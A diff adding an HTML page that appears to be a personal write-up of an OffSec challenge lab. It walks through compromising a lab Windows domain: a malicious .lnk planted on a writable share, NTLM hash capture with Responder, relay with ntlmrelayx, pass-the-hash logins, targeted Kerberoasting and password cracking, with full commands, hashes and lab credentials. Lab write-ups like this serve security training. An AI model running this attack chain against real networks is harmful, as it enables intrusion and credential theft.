@@ -1,0 +1,186 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">OffSec Challenge Lab 10 Laser</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/laser]
+└─$ nxc smb IPs -u Eric.Wallows -p 'EricLikesRunning800' --shares
+SMB         192.168.214.173 445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:laser.com) (signing:False) (SMBv1:False)                                                                                                     
+SMB         192.168.214.172 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:laser.com) (signing:True) (SMBv1:False)                                                                                                      
+SMB         192.168.214.174 445    MS02             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS02) (domain:laser.com) (signing:False) (SMBv1:False)                                                                                                     
+SMB         192.168.214.173 445    MS01             [+] laser.com\Eric.Wallows:EricLikesRunning800 
+SMB         192.168.214.172 445    DC01             [+] laser.com\Eric.Wallows:EricLikesRunning800 
+SMB         192.168.214.174 445    MS02             [+] laser.com\Eric.Wallows:EricLikesRunning800 
+SMB         192.168.214.173 445    MS01             [*] Enumerated shares
+SMB         192.168.214.173 445    MS01             Share           Permissions     Remark
+SMB         192.168.214.173 445    MS01             -----           -----------     ------
+SMB         192.168.214.173 445    MS01             ADMIN$                          Remote Admin
+SMB         192.168.214.173 445    MS01             Apps            READ,WRITE      
+SMB         192.168.214.173 445    MS01             C$                              Default share
+SMB         192.168.214.173 445    MS01             IPC$            READ            Remote IPC
+SMB         192.168.214.174 445    MS02             [*] Enumerated shares
+SMB         192.168.214.174 445    MS02             Share           Permissions     Remark
+SMB         192.168.214.174 445    MS02             -----           -----------     ------
+SMB         192.168.214.174 445    MS02             ADMIN$                          Remote Admin
+SMB         192.168.214.174 445    MS02             C$                              Default share
+SMB         192.168.214.174 445    MS02             IPC$            READ            Remote IPC
+SMB         192.168.214.172 445    DC01             [*] Enumerated shares
+SMB         192.168.214.172 445    DC01             Share           Permissions     Remark
+SMB         192.168.214.172 445    DC01             -----           -----------     ------
+SMB         192.168.214.172 445    DC01             ADMIN$                          Remote Admin
+SMB         192.168.214.172 445    DC01             C$                              Default share
+SMB         192.168.214.172 445    DC01             IPC$            READ            Remote IPC
+SMB         192.168.214.172 445    DC01             NETLOGON        READ            Logon server share 
+SMB         192.168.214.172 445    DC01             SYSVOL          READ            Logon server share </code></pre></div>
+
+<p class="text">I found WRITE privilege on SMB share Apps. There are several lnk files. It's possible that the lnk file is executed automatically.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/laser]
+└─$ smbclient //192.168.214.173/Apps -U "laser.com/Eric.Wallows%EricLikesRunning800"
+WARNING: no network interfaces found
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Thu Dec  4 05:00:32 2025
+  ..                                  D        0  Thu Dec  4 05:00:32 2025
+  Event Viewer.lnk                    A     1168  Sat Sep 15 03:12:46 2018
+  Print Management.lnk                A     1118  Sat Sep 15 03:13:16 2018
+  Services.lnk                        A     1158  Sat Sep 15 03:12:52 2018
+  Task Scheduler.lnk                  A     1132  Sat Sep 15 03:12:23 2018</code></pre></div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows/pylnk]
+└─$ python3 pylnk3.py create C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -i \\\\192.168.45.164\\share malicious.lnk</code></pre></div>
+<p class="text">I set icon href to my local kali machine IP, and opened responder to get NTLMv2 hash.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/laser]
+└─$ sudo responder -I tun0 -v                  
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+...
+[SMB] NTLMv2-SSP Client   : 192.168.214.173
+[SMB] NTLMv2-SSP Username : LASER\carl.dean
+[SMB] NTLMv2-SSP Hash     : carl.dean::LASER:9d1ad6d9cc732a65:5698499515FCC0DF3A12E3102FA3D836:010100000000000080E39C68DB64DC01D93428B0F1DA96690000000002000800320051004400330001001E00570049004E002D00410033003700460056004B004D003200570046005A0004003400570049004E002D00410033003700460056004B004D003200570046005A002E0032005100440033002E004C004F00430041004C000300140032005100440033002E004C004F00430041004C000500140032005100440033002E004C004F00430041004C000700080080E39C68DB64DC010600040002000000080030003000000000000000000000000020000043155F1E440213F3ECDB598AC228CA5412784AD2D700C31068AE8A63D016B9BA0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E00310036003400000000000000000000000000                               
+[SMB] NTLMv2-SSP Client   : 192.168.214.173
+[SMB] NTLMv2-SSP Username : LASER\carl.dean
+[SMB] NTLMv2-SSP Hash     : carl.dean::LASER:3a04ed6649e6b120:8A65436FB2D32A0A5BD3B0CCF08540E8:010100000000000080E39C68DB64DC011EA49D0CC0037D220000000002000800320051004400330001001E00570049004E002D00410033003700460056004B004D003200570046005A0004003400570049004E002D00410033003700460056004B004D003200570046005A002E0032005100440033002E004C004F00430041004C000300140032005100440033002E004C004F00430041004C000500140032005100440033002E004C004F00430041004C000700080080E39C68DB64DC010600040002000000080030003000000000000000000000000020000043155F1E440213F3ECDB598AC228CA5412784AD2D700C31068AE8A63D016B9BA0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E00310036003400000000000000000000000000                               
+[SMB] NTLMv2-SSP Client   : 192.168.214.173</code></pre></div>
+
+<p class="text">I got NTLMv2 hash. However, the hash is not crackable. So, I tried NTLM hash relay.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/laser]
+└─$ sudo impacket-ntlmrelayx -t 192.168.214.174 -smb2support -ip 192.168.45.164 -l loot_laser -dh
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+...
+[*] (SMB): Connection from 192.168.214.173 controlled, but there are no more targets left!
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:15759746f66f2da88d58f0160f8ee676:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1ebc870a303efa8d64fa1a840025ad84:::
+[*] smb://LASER/CARL.DEAN@192.168.214.174 [1] -> Done dumping SAM hashes for host: 192.168.214.174</code></pre></div>
+
+
+<p class="text">I got administrator NTLM hash. To check validity of this hash, I used nxc again.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/laser]
+└─$ nxc smb 192.168.214.174 -u administrator -H 15759746f66f2da88d58f0160f8ee676 --local-auth
+SMB         192.168.214.174 445    MS02             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS02) (domain:MS02) (signing:False) (SMBv1:False)                                                                                                          
+SMB         192.168.214.174 445    MS02             [+] MS02\administrator:15759746f66f2da88d58f0160f8ee676 (Pwn3d!)</code></pre></div>
+
+<p class="text">I can logon to MS02 as administratot via evil-winrm.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/laser]
+└─$ evil-winrm -i 192.168.214.174 -u administrator -H 15759746f66f2da88d58f0160f8ee676             
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents></code></pre></div>
+
+
+
+<h2 class="subtitle">Information Collection</h2>
+<p class="text">I found pcapng file. I installed this on my local kali machine and analyzed it with wireshark.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\Administrator\documents> dir
+                                                                                                                                 
+                                                                                                                                 
+    Directory: C:\Users\Administrator\documents                                                                                  
+                                                                                                                                 
+                                                                                                                                 
+Mode                LastWriteTime         Length Name                                                                            
+----                -------------         ------ ----                                                                            
+-a----        2/12/2025   6:59 PM        1365464 traffic-capture-latest.pcapng  
+
+*Evil-WinRM* PS C:\Users\Administrator\documents> download traffic-capture-latest.pcapng
+                                        
+Info: Downloading C:\Users\Administrator\documents\traffic-capture-latest.pcapng to traffic-capture-latest.pcapn</code></pre></div>
+
+<p class="text">On my local machine...</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/laser]
+└─$ wireshark traffic-capture-latest.pcapng</code></pre></div>
+<div class="img">
+    <img src="{% static 'EthHack/images/laser/1.png' %}" alt="">
+    <p class="text">I filtered <u>http.request.method=="POST"</u>, and I found credential for yulia.weber user.</p>
+</div>
+
+<h2 class="subtitle">BloodHound</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/laser/2.png' %}" alt="">
+    <p class="text">The user yulia has GenericWrite privilege against boris. I used targetedkerberoast.py to get NTLMv2 hash.</p>
+</div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows/targetedKerberoast]
+└─$ python3 targetedKerberoast.py --dc-ip 192.168.214.172 -d laser.com -u yulia.weber -p 'Yulia@Laser777'          
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[+] Printing hash for (boris.crawford)
+$krb5tgs$23$*boris.crawford$LASER.COM$laser.com/boris.crawford*$3df792154fc82f8724d9b960fed73825$7cf70ba3f78e4768a6d6290deecaaa173f9753ddec8c0696a12fd8d0ec2154762d436d3ef6a729c0dd737a69c3b2533725a9d9499ed06d2e4da24ac58f5ed49c673f6d7c50f4053f0295206bc36fdb53f81e7eb413806c10201967eed57f20d6a23acc64db29edbb409e1e6d90e175695184da3501c856fc8e92ed9b40c0893e10627dcf4c24eedec5638f51c26e2bf9300882c7961f11614757b36228f8b37a671362fa6326f9308400a2529de88f96a3c73185be39ebe601d44c6025e8e0b466f4d7ad820970bf2ff5c6d70730c1d597916d27c78c2fbde8ea7669971db9f96ecce0b4db8d3a742236d5aec2cfe2f76b7424892a5898ef14b8188264f3843e440bb4c6cab136bb926041315202bbabdb338a456f8018f0fed94e6fb7247fc8ca1879fd959611418d5fa0319b42b641420e684b598e791d22fdd4ab2044e18dee0d6d3d1574c9a65285b4a392afb541ab84825497266162d023d93e4064635d82adbeed342a1d9fa09e9c2a90d60fe05faddf3c0cbbb59fba21430618910ef595f590e77f9acfdc2a175a7e0970c8d0e4f7ae769de97b62066ed9de4013fc497ebbad654a0e23d6a46d968bb91404f5dc43dd3ddeade2b6431affa27d38e74c75ada452816c41fbb594d091518eb50c22c2b88d01ac526f899d8588c743472852f691feedece491307ed7e53ddba21eb4a3a313f857960e195347c0b7c25c6e4abeae45846da102a0c8a2617ae50da8cdfc38dd1fb6cb68e5e082f36af8f4365120e3c18804f796c705bd3e4d9c8b9ba0c13d1a30c943a3b55d8e959bc16ced1532a835c3fa58a223bce38acd0abd8d34bcb599453effa9a8481539184f3dd6e292cde99c46cb0f3ca9e8986c8bf0382e40dc5bf4c138f066c0d37214974dd428d8fcfc93710735fbc05827d9f4c11f92da2848ffadc0c23d4837fa53c6997eb8ebc0edae1543710af07d0636ae264c3af862596d6ca9734173f5fae172220d3ce17722fd6711c98134b3bfb4bf2339c14b4778586058bfd4e5f51126df2b7babce3c042833bcd1fbf884abb6fc7b86b4832e1371145b345c1ceda462a270ee22426ea29926d8f8c3aadc575dd766c2138aefd691ae47a6bb68cece2d4e68208b967ac94ad2d6f0ebcf37bc4809800f25aad498679e66a98aafdfbd51a39c1b87790b56e5df44cc6cdd40db1ffc546889787501bdd51de7bf9e6eeb4c6117b6e4ec52f91667f71a78b52dd390d41987f372c872c73526ec31914ff2da17e3ea644aa712438ae66735d97bf0af59707534dbef332125d7883a07440ed6</code></pre></div>
+<p class="text">I copied and pasted to file named boris, and cracked this hash with john.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/laser]
+└─$ john boris --wordlist=/usr/share/wordlists/rockyou.txt
+...
+zxcvbnm</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/laser]
+└─$ nxc smb 192.168.214.172 -u boris.crawford -p 'zxcvbnm'                           
+SMB         192.168.214.172 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:laser.com) (signing:True) (SMBv1:False)                                                                                                      
+SMB         192.168.214.172 445    DC01             [+] laser.com\boris.crawford:zxcvbnm (Pwn3d!) </code></pre></div>
+
+<p class="text">This user is a member of domain admins.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/laser]
+└─$ evil-winrm -i 192.168.214.172 -u boris.crawford -p 'zxcvbnm'                
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\boris.crawford\Documents> </code></pre></div>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\administrator\desktop> type proof.txt ;hostname;whoami;ipconfig
+34174fa61540ec665c54fa223e80cdcf
+DC01
+laser\boris.crawford
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 192.168.214.172
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.214.254</code></pre></div>
+
+</body>
+</html>
